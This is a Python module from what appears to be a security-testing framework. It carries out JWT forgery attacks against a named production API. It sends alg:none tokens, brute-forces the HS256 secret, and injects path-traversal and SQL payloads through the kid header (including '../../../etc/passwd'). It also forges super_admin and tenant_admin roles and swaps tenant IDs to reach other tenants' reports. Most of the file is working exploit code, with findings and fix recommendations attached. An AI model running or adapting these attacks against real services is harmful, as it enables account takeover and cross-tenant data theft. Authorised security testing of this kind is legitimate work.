"""
E1b - JWT Forgery & Algorithm Confusion (REST cousin of E1).

Tests OrbitShift's prod JWT (HS256, 7-day TTL, no observed revocation) against
six classic attacks. Sister module of e1_weak_auth.py — the existing E1 module
covers MCP "no auth" scenarios; this one covers REST-API JWT attacks.

Probes:
    P1  alg:none strip
    P2  HS256 secret bruteforce (Top-100 weak secrets)
    P3  kid header path-traversal / SQLi
    P4  Role-elevation forgery (super_admin, tenant_admin) — only run if P1 or P2 lands
    P5  Cross-tenant tenant_id swap                          — only run if P1 or P2 lands
    P6  JKU/JWK header redirect (passive — checks if server fetches an attacker URL)

Usage (standalone, recommended):
    python -m src.attacks.e1b_jwt_forgery --token-file token_orbitshift.txt
    python -m src.attacks.e1b_jwt_forgery --token-file token_orbitshift.txt --verbose

Usage (framework):
    The class subclasses AttackModule for parity but its run() method is
    sync-bridged inside the standalone CLI. Framework wiring (when MCP-engine
    integration is needed) would override the constructor to inject the REST
    config rather than a ProbeEngine.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from datetime import datetime
from typing import Any

import httpx

from src.attacks._rest_helpers import (
    AMBIGUOUS, ERROR, FAIL, PASS, SKIP,
    HttpResponse, JWT_WEAK_SECRETS_TOP100, ProbeResult, RateLimiter,
    decode_jwt, forge_jwt_alg_none, forge_jwt_hs256,
    http_probe, load_token_from_path, verify_hs256,
)
from src.attack_base import AttackModule
from src.models import (
    Evidence, EvidenceType, Fixability, Finding, ReplayInfo, Severity,
)

API_BASE = "https://prodapi.orbitshift.ai"

# Endpoints to replay forged tokens against. Chosen so we have a known-200
# self-read endpoint (positive control) plus 3 endpoints that should normally
# require ownership / admin role.
SELF_READ_ENDPOINT_TEMPLATE = "/v1/tenants/{t}/users/{u}/persona/custom"
SELF_READ_BODY = {"linkedin_url": "linkedin.com/in/aaron-ahola-2421226"}
ADMIN_PROBE_PATHS = [
    "/v1/admin/tenants",
    "/v1/admin/users",
    "/v1/admin/feature_flags",
]
CROSS_TENANT_PROBE_TEMPLATE = "/v1/tenants/{t}/users/{u}/accounts/{a}/research_report"
CROSS_TENANT_TEST_IDS = [(200, 1, 7989), (199, 1, 7989), (202, 1, 7989)]

# Roles confirmed in JS bundle role-gates
HIGH_VALUE_ROLES = ["super_admin", "tenant_admin"]


def _classify_persona_response(resp: HttpResponse) -> tuple[str, str]:
    """
    Classify a POST /persona/custom response when probing with a forged token.
    Real auth-failure on this endpoint returns 401 with `{"error": "...token..."}`.
    Real success returns 200 with `{"success": true, "data": {...}}`.
    """
    if resp.error:
        return ERROR, f"transport error: {resp.error}"
    if resp.status == 200 and len(resp.text) > 50:
        # Genuine 200s on /persona/custom return ~500B+ of psychographic data.
        return FAIL, f"200 OK with forged token ({len(resp.text)} bytes returned)"
    if resp.status == 200:
        return AMBIGUOUS, f"200 OK but tiny body ({len(resp.text)}B) - inspect"
    if resp.status in (401, 403):
        return PASS, f"{resp.status} - forged token rejected"
    if resp.status == 404:
        # POST with valid token returns 200 or 401; 404 here means route truly absent.
        return AMBIGUOUS, "404 - unexpected for a known-existing route; possible host/path mismatch"
    if resp.status == 405:
        return AMBIGUOUS, "405 - method not allowed (route exists but wrong verb; no auth signal)"
    if 500 <= (resp.status or 0) < 600:
        return AMBIGUOUS, f"{resp.status} - server error (route may have accepted token then errored)"
    return AMBIGUOUS, f"unexpected HTTP {resp.status}"


def _classify_admin_response(resp: HttpResponse) -> tuple[str, str]:
    if resp.error:
        return ERROR, f"transport error: {resp.error}"
    if resp.status == 200:
        return FAIL, f"200 OK on admin route with forged token ({len(resp.text)}B)"
    if resp.status in (401, 403):
        return PASS, f"{resp.status} - admin route rejected forged token"
    if resp.status == 404:
        # The admin recon already showed 404 here — that's a route-doesn't-exist
        # signal, not an auth-success signal.
        return PASS, "404 - admin route does not exist on prodapi"
    return AMBIGUOUS, f"unexpected HTTP {resp.status}"


# ── Probe implementations ──

def probe_alg_none(client: httpx.Client, original_token: str,
                   payload: dict, rl: RateLimiter) -> list[ProbeResult]:
    """P1: replay an alg:none-forged token against self-read + admin endpoints."""
    forged = forge_jwt_alg_none(payload)
    results: list[ProbeResult] = []
    tenant = payload.get("tenant_id")
    user   = payload.get("user_id")

    # Variant 1: self-read with alg:none — if the server validates signature
    # correctly, this fails 401. If it accepts unsigned tokens, 200 with persona data.
    self_url = API_BASE + SELF_READ_ENDPOINT_TEMPLATE.format(t=tenant, u=user)
    rl.wait()
    resp = http_probe(client, "POST", self_url, token=forged, json_body=SELF_READ_BODY)
    status, actual = _classify_persona_response(resp)
    results.append(ProbeResult(
        probe_id="E1b.P1.1",
        status=status,
        title="alg:none + self-claims (POST /persona/custom)",
        expected="401 - server must reject unsigned token",
        actual=actual,
        request_url=self_url,
        http_code=resp.status,
        response=resp.text,
        evidence={"forged_token_redacted": forged[:40] + "..." + forged[-10:],
                  "request_body": SELF_READ_BODY},
        notes="If 200 with persona data → alg:none accepted, JWT validation broken.",
    ))

    # Variant 2: alg:none against /v1/admin/tenants (admin route)
    rl.wait()
    admin_url = API_BASE + ADMIN_PROBE_PATHS[0]
    resp = http_probe(client, "GET", admin_url, token=forged)
    status, actual = _classify_admin_response(resp)
    results.append(ProbeResult(
        probe_id="E1b.P1.2",
        status=status,
        title="alg:none against /v1/admin/tenants",
        expected="401/403/404",
        actual=actual,
        request_url=admin_url,
        http_code=resp.status,
        response=resp.text,
    ))
    return results


def probe_secret_bruteforce(original_token: str) -> tuple[ProbeResult, str | None]:
    """P2: try Top-100 weak HS256 secrets. Returns (probe_result, recovered_secret_or_None).
    Pure local crypto — no HTTP requests."""
    discovered: str | None = None
    for secret in JWT_WEAK_SECRETS_TOP100:
        if verify_hs256(original_token, secret):
            discovered = secret
            break

    if discovered is not None:
        return ProbeResult(
            probe_id="E1b.P2",
            status=FAIL,
            title="HS256 secret bruteforce (Top-100 weak secrets)",
            expected="No weak secret should verify the token",
            actual=f"WEAK SECRET RECOVERED: {discovered!r} verifies the token",
            evidence={"secret": discovered, "wordlist_size": len(JWT_WEAK_SECRETS_TOP100)},
        ), discovered
    return ProbeResult(
        probe_id="E1b.P2",
        status=PASS,
        title="HS256 secret bruteforce (Top-100 weak secrets)",
        expected="No weak secret should verify the token",
        actual=f"None of {len(JWT_WEAK_SECRETS_TOP100)} weak secrets verified the token",
    ), None


def probe_kid_header(client: httpx.Client, original_token: str, payload: dict,
                     rl: RateLimiter) -> list[ProbeResult]:
    """P3: kid header path-traversal / SQLi. Try a few classic kid payloads.
    These either exploit SQL injection in JWKS lookup, or LFI in kid->path mapping.
    The token is forged with HS256+empty secret so the server's kid-loaded key
    must be empty for it to verify."""
    results: list[ProbeResult] = []
    kid_payloads = [
        ("E1b.P3.1", {"kid": "../../../../../../dev/null"},      "LFI to /dev/null"),
        ("E1b.P3.2", {"kid": "x' UNION SELECT 'AAAA' --"},        "SQLi in kid"),
        ("E1b.P3.3", {"kid": "../../../etc/passwd"},              "LFI to /etc/passwd"),
    ]
    self_url = API_BASE + SELF_READ_ENDPOINT_TEMPLATE.format(
        t=payload.get("tenant_id"), u=payload.get("user_id"))
    for probe_id, header_extra, label in kid_payloads:
        # /dev/null -> file is empty; signing with empty bytes
        forged = forge_jwt_hs256(payload, b"", header_extra=header_extra)
        rl.wait()
        resp = http_probe(client, "POST", self_url, token=forged, json_body=SELF_READ_BODY)
        status, actual = _classify_persona_response(resp)
        results.append(ProbeResult(
            probe_id=probe_id,
            status=status,
            title=f"kid header injection: {label}",
            expected="401/403/404 - server should reject crafted kid",
            actual=actual,
            request_url=self_url,
            http_code=resp.status,
            response=resp.text,
            notes=f"kid={header_extra['kid']!r}",
        ))
    return results


def probe_role_elevation(client: httpx.Client, original_payload: dict,
                          recovered_secret: str, rl: RateLimiter) -> list[ProbeResult]:
    """P4: forge tokens with elevated roles, replay against admin routes.
    Only runs if P2 recovered a secret (so we can sign valid HS256)."""
    results: list[ProbeResult] = []
    for role in HIGH_VALUE_ROLES:
        forged_payload = dict(original_payload)
        forged_payload["role"] = role
        forged = forge_jwt_hs256(forged_payload, recovered_secret)
        for path in ADMIN_PROBE_PATHS:
            rl.wait()
            url = API_BASE + path
            resp = http_probe(client, "GET", url, token=forged)
            status, actual = _classify_admin_response(resp)
            results.append(ProbeResult(
                probe_id=f"E1b.P4.{role}.{path.split('/')[-1]}",
                status=status,
                title=f"Forged role={role} replay against {path}",
                expected="404 (admin route absent) or 401/403",
                actual=actual,
                request_url=url,
                http_code=resp.status,
                response=resp.text,
                evidence={"forged_role": role,
                          "forged_token_redacted": forged[:40] + "..." + forged[-10:]},
            ))
    return results


def probe_cross_tenant_forge(client: httpx.Client, original_payload: dict,
                              recovered_secret: str, rl: RateLimiter) -> list[ProbeResult]:
    """P5: forge tokens with different tenant_id and probe research_report on
    accounts the original tenant doesn't own."""
    results: list[ProbeResult] = []
    for tid, uid, aid in CROSS_TENANT_TEST_IDS:
        forged_payload = dict(original_payload)
        forged_payload["tenant_id"] = tid
        forged_payload["user_id"]   = uid
        forged = forge_jwt_hs256(forged_payload, recovered_secret)
        url = API_BASE + CROSS_TENANT_PROBE_TEMPLATE.format(t=tid, u=uid, a=aid)
        rl.wait()
        resp = http_probe(client, "GET", url, token=forged)
        if resp.error:
            status, actual = ERROR, f"transport error: {resp.error}"
        elif resp.status == 200 and len(resp.text) > 50:
            status, actual = FAIL, f"200 OK with {len(resp.text)} bytes - cross-tenant data with forged token"
        elif resp.status in (401, 403, 404):
            status, actual = PASS, f"{resp.status} - server rejected"
        else:
            status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
        results.append(ProbeResult(
            probe_id=f"E1b.P5.t{tid}",
            status=status,
            title=f"Cross-tenant forged token: tenant={tid}, user={uid}",
            expected="401/403/404",
            actual=actual,
            request_url=url,
            http_code=resp.status,
            response=resp.text,
            evidence={"forged_tenant_id": tid, "forged_user_id": uid},
        ))
    return results


def probe_jku_header(client: httpx.Client, payload: dict, rl: RateLimiter) -> ProbeResult:
    """P6: JKU header redirect — sets jku to a canary URL. We don't actually
    host one; we just check whether the server complains in a way that
    suggests it tried to fetch the URL."""
    canary = "http://orbitshift-jku-canary.invalid/jwks.json"
    forged = forge_jwt_hs256(payload, "ignored", header_extra={"jku": canary})
    self_url = API_BASE + SELF_READ_ENDPOINT_TEMPLATE.format(
        t=payload.get("tenant_id"), u=payload.get("user_id"))
    rl.wait()
    resp = http_probe(client, "POST", self_url, token=forged, json_body=SELF_READ_BODY)
    if resp.error:
        return ProbeResult(
            probe_id="E1b.P6", status=ERROR,
            title="JKU header redirect (canary)",
            expected="Server should NOT fetch the jku URL or accept the token.",
            actual=f"transport error: {resp.error}",
            request_url=self_url,
        )
    # Suspicious signals: 502/504 (proxy fetch failure), or unusually long
    # response time. We don't measure latency here; just look for status hints.
    suspicious = resp.status in (502, 504)
    response_text = resp.text or ""
    if "fetch" in response_text.lower() or "jku" in response_text.lower():
        suspicious = True
    return ProbeResult(
        probe_id="E1b.P6",
        status=AMBIGUOUS if suspicious else PASS,
        title="JKU header redirect (canary)",
        expected="Server should ignore unknown jku and reject token (401/403)",
        actual=("server reachable; status=%d, error mentions fetch/jku=%s"
                % (resp.status or -1, suspicious)),
        request_url=self_url,
        http_code=resp.status,
        response=resp.text,
        notes=f"canary URL: {canary}",
    )


# ── Module class (for framework parity) ──


class E1bJWTForgery(AttackModule):
    name = "JWT Forgery & Algorithm Confusion (REST)"
    surface = "E - Transport & Authentication"
    module_id = "E1b"
    description = (
        "Tests REST API JWT for alg:none acceptance, weak HS256 secret, "
        "kid-header injection, role-elevation forgery, cross-tenant token forgery, "
        "and JKU header redirect."
    )

    def __init__(self, engine=None, *, token: str | None = None,
                 api_base: str = API_BASE, rps: float = 2.0) -> None:
        # The base class wants a ProbeEngine; for REST cousin we accept None.
        # We bypass super().__init__ to avoid the engine requirement.
        self.engine = engine
        self.findings: list[Finding] = []
        self._finding_counter: int = 0
        self.token = token
        self.api_base = api_base
        self.rps = rps
        self.probe_results: list[ProbeResult] = []
        self.recovered_secret: str | None = None

    async def run(self) -> list[Finding]:
        if not self.token:
            raise RuntimeError("E1bJWTForgery requires a JWT (constructor `token=...`).")
        self.run_sync()  # delegate to sync runner
        return self.findings

    # Synchronous runner used by both async run() and standalone CLI ----------

    def run_sync(self) -> tuple[list[ProbeResult], list[Finding]]:
        try:
            header, payload, _sig = decode_jwt(self.token)
        except Exception as exc:
            raise RuntimeError(f"could not decode JWT: {exc}") from exc

        rl = RateLimiter(self.rps)
        results: list[ProbeResult] = []

        with httpx.Client(timeout=20.0, follow_redirects=False) as client:
            # P1
            results.extend(probe_alg_none(client, self.token, payload, rl))
            # P2 (offline)
            p2, recovered = probe_secret_bruteforce(self.token)
            results.append(p2)
            self.recovered_secret = recovered
            # P3
            results.extend(probe_kid_header(client, self.token, payload, rl))
            # P6 (independent)
            results.append(probe_jku_header(client, payload, rl))
            # P4 + P5 only if P2 yielded a secret
            if recovered is not None:
                results.extend(probe_role_elevation(client, payload, recovered, rl))
                results.extend(probe_cross_tenant_forge(client, payload, recovered, rl))

        self.probe_results = results
        self._materialize_findings(payload, header)
        return results, self.findings

    def _materialize_findings(self, payload: dict, header: dict) -> None:
        """Convert FAIL probe results into Finding objects."""
        any_fail = any(r.status == FAIL for r in self.probe_results)
        if not any_fail:
            return

        # Group: report one finding per discovered weakness
        for r in self.probe_results:
            if r.status != FAIL:
                continue
            severity = (Severity.CRITICAL if r.probe_id.startswith("E1b.P2")
                        or r.probe_id.startswith("E1b.P4")
                        or r.probe_id.startswith("E1b.P5")
                        else Severity.HIGH)
            self._finding_counter += 1
            fid = f"{self.module_id}-{self._finding_counter:03d}"
            self.findings.append(Finding(
                id=fid,
                title=r.title,
                surface=self.surface,
                module=f"{self.module_id} - {self.name}",
                severity=severity,
                fixability=Fixability.CONFIGURATION,
                fixability_rationale="JWT signing keys / algorithm enforcement is configurable.",
                description=r.actual,
                attack_narrative=(
                    f"1. Decoded the existing JWT (header={header}, payload claims={list(payload.keys())})\n"
                    f"2. Probe {r.probe_id}: {r.title}\n"
                    f"3. Expected: {r.expected}\n"
                    f"4. Observed: {r.actual}"
                ),
                evidence=[Evidence(
                    type=EvidenceType.CONNECTION_ATTEMPT,
                    request={"url": r.request_url, "probe": r.probe_id, "notes": r.notes},
                    response={"status": r.http_code,
                              "body_snippet": (r.response[:300] if r.response else None),
                              **(r.evidence or {})},
                )],
                replay=ReplayInfo(
                    command=f"python -m src.attacks.e1b_jwt_forgery --token-file token_orbitshift.txt",
                    trace_file=f"output/e1b/{fid}.json",
                ),
                recommendation=(
                    "Reject alg:none. Use a long random HS256 secret (>= 256 bits) or migrate to "
                    "asymmetric (RS256/ES256). Validate `iss`, `aud`, and short-lived `exp`. "
                    "Reject unknown `kid`/`jku`/`jwk` headers."
                ),
            ))


# ── CLI entry point ──

def _print_results(results: list[ProbeResult], verbose: bool) -> None:
    for r in results:
        if not verbose:
            r.response = (r.response or "")[:300]
        print(r)


def main() -> int:
    p = argparse.ArgumentParser(description="E1b - JWT Forgery & Algorithm Confusion (OrbitShift).")
    p.add_argument("--token", help="Bearer JWT (overrides --token-file)")
    p.add_argument("--token-file", default="token_orbitshift.txt")
    p.add_argument("--api-base", default=API_BASE)
    p.add_argument("--rps", type=float, default=2.0)
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--output-dir", default="output/e1b")
    args = p.parse_args()

    if args.token:
        token = args.token.strip()
    else:
        if not os.path.exists(args.token_file):
            sys.exit(f"ERROR: token file not found at {args.token_file}")
        token = load_token_from_path(args.token_file)

    module = E1bJWTForgery(engine=None, token=token, api_base=args.api_base, rps=args.rps)
    try:
        results, findings = module.run_sync()
    except Exception as exc:
        print(f"ERROR: {exc}")
        return 2

    print("=" * 72)
    print(" E1b - JWT Forgery & Algorithm Confusion")
    print("=" * 72)
    header, payload, _ = decode_jwt(token)
    print(f"  Header        : {header}")
    print(f"  Payload claims: {list(payload.keys())}")
    print(f"  Wordlist size : {len(JWT_WEAK_SECRETS_TOP100)}")
    print(f"  API base      : {args.api_base}")

    _print_results(results, args.verbose)

    counts: dict[str, int] = {}
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1
    print()
    print("=" * 72)
    print(f"  PROBE COUNTS    : {counts}")
    print(f"  FINDINGS        : {len(findings)}")
    if module.recovered_secret is not None:
        print(f"  RECOVERED SECRET: {module.recovered_secret!r}  *** CRITICAL ***")
    print("=" * 72)

    os.makedirs(args.output_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(args.output_dir, f"e1b_{ts}.json")
    payload_serializable: dict[str, Any] = {
        "module": "E1b",
        "title": E1bJWTForgery.name,
        "target": args.api_base,
        "timestamp": ts,
        "header": header,
        "payload_claims": list(payload.keys()),
        "wordlist_size": len(JWT_WEAK_SECRETS_TOP100),
        "recovered_secret": module.recovered_secret,
        "counts": counts,
        "probes": [r.to_dict() for r in results],
        "findings": [f.model_dump(mode="json") for f in findings],
    }
    with open(out_path, "w") as fh:
        json.dump(payload_serializable, fh, indent=2, default=str)
    print(f"\n  Results saved: {out_path}")
    return 0 if not findings else 1


if __name__ == "__main__":
    sys.exit(main())
